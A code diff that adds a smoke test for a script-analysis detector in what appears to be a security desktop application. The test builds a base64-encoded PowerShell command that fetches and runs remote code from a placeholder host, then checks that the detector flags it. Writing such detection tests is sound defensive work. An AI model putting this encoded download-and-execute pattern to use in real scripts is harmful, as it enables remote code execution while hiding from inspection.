@@ -644,8 +644,9 @@ def smoke_test():
         activity_passed = activity_passed and window._unread_bc_notices == 0
         vault_passed = _smoke_quarantine()
         intel_passed = _smoke_research_intel()
+        script_passed = _smoke_script_analysis()
         return {
-            "passed": monitor_passed and activity_passed and vault_passed and intel_passed and all(value == 0 for value in overflow.values()) and
+            "passed": monitor_passed and activity_passed and vault_passed and intel_passed and script_passed and all(value == 0 for value in overflow.values()) and
                 (window.storage_page.launch_button.isEnabled() or not getattr(sys, "frozen", False)),
             "page_count": window.stack.count(), "command_count": len(window.command_buttons),
             "horizontal_overflow": overflow, "operational_desktop": True,
@@ -654,9 +655,19 @@ def smoke_test():
             "bc_rename_activity": activity_passed,
             "bc_quarantine": vault_passed,
             "bc_research_intel": intel_passed,
+            "bc_script_analysis": script_passed,
         }
     finally:
         window.close()
+
+
+def _smoke_script_analysis():
+    from base64 import b64encode
+    from sentinel.bc_script_analysis import inspect_script
+
+    flow = "IEX (IRM 'https://example.invalid')"
+    carrier = b"powershell.exe -EncodedCommand " + b64encode(flow.encode("utf-16-le"))
+    return bool(inspect_script(carrier, ".cmd")) and not inspect_script(b"Write-Output 'hello'", ".ps1")
 
 
 def _smoke_research_intel():
